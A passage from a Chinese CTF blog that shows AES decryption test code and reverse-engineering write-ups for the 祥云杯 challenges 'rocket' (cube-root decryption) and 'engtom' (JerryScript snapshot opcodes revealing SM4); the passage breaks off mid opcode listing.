class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/****************************************************************************************************************/</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">aes_cypher_128_test</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 1</span></span><br><span class="line">	<span class="type">uint8_t</span> buf[] = &#123; <span class="number">0x00</span>, <span class="number">0x11</span>, <span class="number">0x22</span>, <span class="number">0x33</span>, <span class="number">0x44</span>, <span class="number">0x55</span>, <span class="number">0x66</span>, <span class="number">0x77</span>,</span><br><span class="line">		<span class="number">0x88</span>, <span class="number">0x99</span>, <span class="number">0xaa</span>, <span class="number">0xbb</span>, <span class="number">0xcc</span>, <span class="number">0xdd</span>, <span class="number">0xee</span>, <span class="number">0xff</span> &#125;;</span><br><span class="line">	<span class="type">uint8_t</span> key[] = &#123; <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x03</span>, <span class="number">0x04</span>, <span class="number">0x05</span>, <span class="number">0x06</span>, <span class="number">0x07</span>,</span><br><span class="line">		<span class="number">0x08</span>, <span class="number">0x09</span>, <span class="number">0x0a</span>, <span class="number">0x0b</span>, <span class="number">0x0c</span>, <span class="number">0x0d</span>, <span class="number">0x0e</span>, <span class="number">0x0f</span> &#125;;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">	<span class="type">uint8_t</span> buf[] = &#123; <span class="number">0x32</span>, <span class="number">0x43</span>, <span class="number">0xf6</span>, <span class="number">0xa8</span>, <span class="number">0x88</span>, <span class="number">0x5a</span>, <span class="number">0x30</span>, <span class="number">0x8d</span>,</span><br><span class="line">		<span class="number">0x31</span>, <span class="number">0x31</span>, <span class="number">0x98</span>, <span class="number">0xa2</span>, <span class="number">0xe0</span>, <span class="number">0x37</span>, <span class="number">0x07</span>, <span class="number">0x34</span> &#125;;</span><br><span class="line">	<span class="type">uint8_t</span> key[] = &#123; <span class="number">0x2b</span>, <span class="number">0x7e</span>, <span class="number">0x15</span>, <span class="number">0x16</span>, <span class="number">0x28</span>, <span class="number">0xae</span>, <span class="number">0xd2</span>, <span class="number">0xa6</span>,</span><br><span class="line">		<span class="number">0xab</span>, <span class="number">0xf7</span>, <span class="number">0x15</span>, <span class="number">0x88</span>, <span class="number">0x09</span>, <span class="number">0xcf</span>, <span class="number">0x4f</span>, <span class="number">0x3c</span> &#125;;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	aes_encrypt(AES_CYPHER_128, buf, <span class="keyword">sizeof</span>(buf), key);</span><br><span class="line"></span><br><span class="line">	aes_decrypt(AES_CYPHER_128, buf, <span class="keyword">sizeof</span>(buf), key);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/****************************************************************************************************************/</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">aes_cypher_192_test</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">uint8_t</span> buf[] = &#123; <span class="number">0x00</span>, <span class="number">0x11</span>, <span class="number">0x22</span>, <span class="number">0x33</span>, <span class="number">0x44</span>, <span class="number">0x55</span>, <span class="number">0x66</span>, <span class="number">0x77</span>,</span><br><span class="line">		<span class="number">0x88</span>, <span class="number">0x99</span>, <span class="number">0xaa</span>, <span class="number">0xbb</span>, <span class="number">0xcc</span>, <span class="number">0xdd</span>, <span class="number">0xee</span>, <span class="number">0xff</span> &#125;;</span><br><span class="line">	<span class="type">uint8_t</span> key[] = &#123; <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x03</span>, <span class="number">0x04</span>, <span class="number">0x05</span>, <span class="number">0x06</span>, <span class="number">0x07</span>,</span><br><span class="line">		<span class="number">0x08</span>, <span class="number">0x09</span>, <span class="number">0x0a</span>, <span class="number">0x0b</span>, <span class="number">0x0c</span>, <span class="number">0x0d</span>, <span class="number">0x0e</span>, <span class="number">0x0f</span>,</span><br><span class="line">		<span class="number">0x10</span>, <span class="number">0x11</span>, <span class="number">0x12</span>, <span class="number">0x13</span>, <span class="number">0x14</span>, <span class="number">0x15</span>, <span class="number">0x16</span>, <span class="number">0x17</span> &#125;;</span><br><span class="line"></span><br><span class="line">	aes_encrypt(AES_CYPHER_192, buf, <span class="keyword">sizeof</span>(buf), key);</span><br><span class="line"></span><br><span class="line">	aes_decrypt(AES_CYPHER_192, buf, <span class="keyword">sizeof</span>(buf), key);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/****************************************************************************************************************/</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">aes_cypher_256_test</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">uint8_t</span> buf[] = &#123; <span class="number">0x00</span>, <span class="number">0x11</span>, <span class="number">0x22</span>, <span class="number">0x33</span>, <span class="number">0x44</span>, <span class="number">0x55</span>, <span class="number">0x66</span>, <span class="number">0x77</span>,</span><br><span class="line">		<span class="number">0x88</span>, <span class="number">0x99</span>, <span class="number">0xaa</span>, <span class="number">0xbb</span>, <span class="number">0xcc</span>, <span class="number">0xdd</span>, <span class="number">0xee</span>, <span class="number">0xff</span> &#125;;</span><br><span class="line">	<span class="type">uint8_t</span> key[] = &#123; <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x03</span>, <span class="number">0x04</span>, <span class="number">0x05</span>, <span class="number">0x06</span>, <span class="number">0x07</span>,</span><br><span class="line">		<span class="number">0x08</span>, <span class="number">0x09</span>, <span class="number">0x0a</span>, <span class="number">0x0b</span>, <span class="number">0x0c</span>, <span class="number">0x0d</span>, <span class="number">0x0e</span>, <span class="number">0x0f</span>,</span><br><span class="line">		<span class="number">0x10</span>, <span class="number">0x11</span>, <span class="number">0x12</span>, <span class="number">0x13</span>, <span class="number">0x14</span>, <span class="number">0x15</span>, <span class="number">0x16</span>, <span class="number">0x17</span>,</span><br><span class="line">		<span class="number">0x18</span>, <span class="number">0x19</span>, <span class="number">0x1a</span>, <span class="number">0x1b</span>, <span class="number">0x1c</span>, <span class="number">0x1d</span>, <span class="number">0x1e</span>, <span class="number">0x1f</span> &#125;;</span><br><span class="line"></span><br><span class="line">	aes_encrypt(AES_CYPHER_256, buf, <span class="keyword">sizeof</span>(buf), key);</span><br><span class="line"></span><br><span class="line">	aes_decrypt(AES_CYPHER_256, buf, <span class="keyword">sizeof</span>(buf), key);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/****************************************************************************************************************/</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;	</span><br><span class="line">	<span class="comment">//数据</span></span><br><span class="line">	<span class="type">uint8_t</span> buf[] = &#123; <span class="number">216</span>, <span class="number">87</span>, <span class="number">202</span>, <span class="number">196</span>, <span class="number">68</span>, <span class="number">68</span>, <span class="number">17</span>, <span class="number">110</span>, <span class="number">131</span>, <span class="number">11</span>, <span class="number">223</span>, <span class="number">113</span>, <span class="number">103</span>, <span class="number">120</span>, <span class="number">149</span>, </span><br><span class="line"><span class="number">125</span>&#125;;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//密钥</span></span><br><span class="line">	<span class="type">uint8_t</span> key[] = &#123;<span class="number">23</span>, <span class="number">147</span>, <span class="number">56</span>, <span class="number">12</span>, <span class="number">17</span>, <span class="number">167</span>, <span class="number">247</span>, <span class="number">84</span>, <span class="number">247</span>, <span class="number">137</span>, <span class="number">200</span>, <span class="number">32</span>, <span class="number">212</span>, <span class="number">26</span>, <span class="number">250</span>, <span class="number">37</span>&#125;;</span><br><span class="line">	<span class="comment">//向量</span></span><br><span class="line">	<span class="type">uint8_t</span> iv[] = &#123;<span class="number">0x4d</span>,<span class="number">0x4f</span>,<span class="number">0x4d</span>,<span class="number">0x43</span>,<span class="number">0x45</span>,<span class="number">0x47</span>,<span class="number">0x45</span>,<span class="number">0x43</span>,<span class="number">0x5d</span>,<span class="number">0x5f</span>,<span class="number">0x5d</span>,<span class="number">0x43</span>,<span class="number">0x45</span>,<span class="number">0x47</span>,<span class="number">0x45</span>,<span class="number">0x43</span>&#125;;</span><br><span class="line">	<span class="keyword">switch</span> (<span class="keyword">sizeof</span>(key))</span><br><span class="line">	&#123;</span><br><span class="line">	<span class="comment">//ECB</span></span><br><span class="line">	<span class="keyword">case</span> <span class="number">16</span>:aes_decrypt(AES_CYPHER_128, buf, <span class="keyword">sizeof</span>(buf), key); <span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">24</span>:aes_decrypt(AES_CYPHER_192, buf, <span class="keyword">sizeof</span>(buf), key); <span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">32</span>:aes_decrypt(AES_CYPHER_256, buf, <span class="keyword">sizeof</span>(buf), key); <span class="keyword">break</span>;</span><br><span class="line">	<span class="comment">//CBC</span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	case 16:aes_decrypt_cbc(AES_CYPHER_128, buf, sizeof(buf), key, iv); break;</span></span><br><span class="line"><span class="comment">	case 24:aes_decrypt_cbc(AES_CYPHER_192, buf, sizeof(buf), key, iv); break;</span></span><br><span class="line"><span class="comment">	case 32:aes_decrypt_cbc(AES_CYPHER_256, buf, sizeof(buf), key, iv); break;</span></span><br><span class="line"><span class="comment">	&#125;</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(buf); i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, buf[i] &amp; <span class="number">0xFF</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 数据</span></span><br><span class="line"><span class="type">uint8_t</span> buf[] = &#123; <span class="number">180</span>, <span class="number">252</span>, <span class="number">42</span>, <span class="number">112</span>, <span class="number">54</span>, <span class="number">254</span>, <span class="number">140</span>, <span class="number">77</span>, <span class="number">50</span>, <span class="number">8</span>, <span class="number">226</span>, <span class="number">68</span>, <span class="number">27</span>, <span class="number">196</span>, <span class="number">57</span>, <span class="number">3</span> &#125;;</span><br><span class="line"><span class="comment">// 密钥</span></span><br><span class="line"><span class="type">uint8_t</span> key[] = &#123; <span class="number">207</span>, <span class="number">196</span>, <span class="number">242</span>, <span class="number">200</span>, <span class="number">85</span>, <span class="number">227</span>, <span class="number">230</span>, <span class="number">58</span>, <span class="number">116</span>, <span class="number">130</span>, <span class="number">23</span>, <span class="number">81</span>, <span class="number">179</span>, <span class="number">98</span>, <span class="number">111</span>, <span class="number">88</span> &#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>得到flag</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://jonathanbest7.github.io/2022/11/01/%E7%A5%A5%E4%BA%91%E6%9D%AF/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/bitbug_favicon.ico">
      <meta itemprop="name" content="bj777">
      <meta itemprop="description" content="一位逆向菜狗">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="bj777的blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/11/01/%E7%A5%A5%E4%BA%91%E6%9D%AF/" class="post-title-link" itemprop="url">祥云杯</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2022-11-01 10:37:26" itemprop="dateCreated datePublished" datetime="2022-11-01T10:37:26+08:00">2022-11-01</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-11-17 10:00:10" itemprop="dateModified" datetime="2022-11-17T10:00:10+08:00">2022-11-17</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="祥云杯"><a href="#祥云杯" class="headerlink" title="祥云杯"></a>祥云杯</h1><p>这次比赛我觉得打的很有意义，有很多值得学习的地方，虽然在最后一分钟被py嘛了，但是还是可以的。</p>
<p><img src="/2022/11/01/%E7%A5%A5%E4%BA%91%E6%9D%AF/image-20221101103957337.png" alt="image-20221101103957337"></p>
<h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><p>本次re题前两题都是第十个做出来的，但遇到后面的ollvm这种题就寄了，所以跟着其他大佬来复现。</p>
<p><strong>rocket</strong></p>
<p>是⼀个⽤racket写的程序，通过动调发现，应该是程序内部有东⻄可以运⾏某些指令，但运⾏时后⾯参数要填对。⽽且动调发现，输⼊之后会产⽣输出⽂件，通过输出⽂件进⾏对⽐。可以说是当成了黑盒来做</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">117649</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="number">125000</span></span><br><span class="line"><span class="number">111</span></span><br><span class="line"><span class="number">33506364520275803793</span></span><br><span class="line"><span class="number">121</span></span><br><span class="line"><span class="number">33514347173167210897</span></span><br><span class="line"><span class="number">123456</span></span><br><span class="line"><span class="number">158267354350243993992524262083318636839704</span></span><br><span class="line"><span class="number">1234567</span></span><br><span class="line"><span class="number">2655285589682614779062545959380794422209298811879</span></span><br></pre></td></tr></table></figure>

<p>发现规律，猜测整个加密是将字符串ascii连接起来转成⼤数，然后进⾏⽴⽅，所以解密也就很简单了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="built_in">print</span>(gmpy2.iroot(<span class="number">72122728040135433910084218324574182235447654897640421711359825692113776202902748285267445589769500040520888384194950935232</span></span><br><span class="line">m = <span class="number">193207530030250486323082807418528242300453594901698934812368796575822264198418283118461</span></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m).decode())</span><br><span class="line"><span class="comment">#得到flag：ctf&#123;th1s_is_re4lly_beaut1fly_r1ght?&#125;</span></span><br></pre></td></tr></table></figure>

<p><strong>engtom</strong></p>
<p>通过strings查询字符串可以看出是JS相关的程序，搜索Js引擎和⽂件头可以认出是JerryScript引擎的快照。</p>
<p>启⽤—show-opcodes和—snapshot-exec编译后，执⾏jerry</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.<span class="regexp">/jerry --show-opcodes --exec-snapshot /m</span>nt<span class="regexp">/d/</span>ctf<span class="regexp">/祥云杯/</span>engtom<span class="regexp">/engtom/</span>chall.snapshot</span><br></pre></td></tr></table></figure>

<p>得到以下结果</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">0</span> : CBC_CHECK_VAR ident:<span class="number">5</span>-&gt;string(SboxTable)</span><br><span class="line">   <span class="attribute">2</span> : CBC_CHECK_VAR ident:<span class="number">6</span>-&gt;string(CK)</span><br><span class="line">   <span class="attribute">4</span> : CBC_CHECK_VAR ident:<span class="number">7</span>-&gt;string(FK)</span><br><span class="line">   <span class="attribute">6</span> : CBC_CHECK_VAR ident:<span class="number">8</span>-&gt;string(bigxor)</span><br><span class="line">   <span class="attribute">8</span> : CBC_CHECK_VAR ident:<span class="number">9</span>-&gt;string(leftshift)</span><br><span class="line">  <span class="attribute">10</span> : CBC_CHECK_VAR ident:<span class="number">10</span>-&gt;string(prefixInteger)</span><br><span class="line">  <span class="attribute">12</span> : CBC_CHECK_VAR ident:<span class="number">11</span>-&gt;string(sm4Sbox)</span><br><span class="line">  <span class="attribute">14</span> : CBC_CHECK_VAR ident:<span class="number">12</span>-&gt;string(GET_ULONG_BE)</span><br><span class="line">  <span class="attribute">16</span> : CBC_CHECK_VAR ident:<span class="number">13</span>-&gt;string(PUT_ULONG_BE)</span><br><span class="line">  <span class="attribute">18</span> : CBC_CHECK_VAR ident:<span class="number">14</span>-&gt;string(sm4_getkey)</span><br><span class="line">  <span class="attribute">20</span> : CBC_CHECK_VAR ident:<span class="number">15</span>-&gt;string(encrypt)</span><br><span class="line">  <span class="attribute">22</span> : CBC_CHECK_VAR ident:<span class="number">16</span>-&gt;string(decrypt_sm4)</span><br><span class="line">  <span class="attribute">24</span> : CBC_CHECK_VAR ident:<span class="number">17</span>-&gt;string(compare_array)</span><br><span class="line">  <span class="attribute">26</span> : CBC_CHECK_VAR ident:<span class="number">18</span>-&gt;string(input)</span><br><span class="line">  <span class="attribute">28</span> : CBC_CHECK_VAR ident:<span class="number">19</span>-&gt;string(num)</span><br><span class="line">  <span class="attribute">30</span> : CBC_CHECK_VAR ident:<span class="number">20</span>-&gt;string(message)</span><br><span class="line">  <span class="attribute">32</span> : CBC_CHECK_VAR ident:<span class="number">21</span>-&gt;string(count)</span><br><span class="line">  <span class="attribute">34</span> : CBC_CHECK_VAR ident:<span class="number">22</span>-&gt;string(pad_len)</span><br><span class="line">  <span class="attribute">36</span> : CBC_CREATE_VAR_EVAL ident:<span class="number">5</span>-&gt;string(SboxTable)</span><br><span class="line">  <span class="attribute">38</span> : CBC_CREATE_VAR_EVAL ident:<span class="number">6</span>-&gt;string(CK)</span><br><span class="line">  <span class="attribute">40</span> : CBC_CREATE_VAR_EVAL ident:<span class="number">7</span>-&gt;string(FK)</span><br><span class="line">  <span class="attribute">42</span> : CBC_CREATE_VAR_FUNC_EVAL lit:<span class="number">91</span> ident:<span class="number">8</span>-&gt;string(bigxor)</span><br><span class="line">  <span class="attribute">45</span> : CBC_CREATE_VAR_FUNC_EVAL lit:<span class="number">92</span> ident:<span class="number">9</span>-&gt;string(leftshift)</span><br><span class="line">  <span class="attribute">48</span> : CBC_CREATE_VAR_FUNC_EVAL lit:<span class="number">93</span> ident:<span class="number">10</span>-&gt;string(prefixInteger)</span><br><span class="line">  <span class="attribute">51</span> : CBC_CREATE_VAR_FUNC_EVAL lit:<span class="number">94</span> ident:<span class="number">11</span>-&gt;string(sm4Sbox)</span><br><span class="line">  <span class="attribute">54</span> : CBC_CREATE_VAR_FUNC_EVAL lit:<span class="number">95</span> ident:<span class="number">12</span>-&gt;string(GET_ULONG_BE)</span><br><span class="line">  <span class="attribute">57</span> : CBC_CREATE_VAR_FUNC_EVAL lit:<span class="number">96</span> ident:<span class="number">13</span>-&gt;string(PUT_ULONG_BE)</span><br><span class="line">  <span class="attribute">60</span> : CBC_CREATE_VAR_FUNC_EVAL lit:<span class="number">97</span> ident:<span class="number">14</span>-&gt;string(sm4_getkey)</span><br><span class="line">  <span class="attribute">63</span> : CBC_CREATE_VAR_FUNC_EVAL lit:<span class="number">98</span> ident:<span 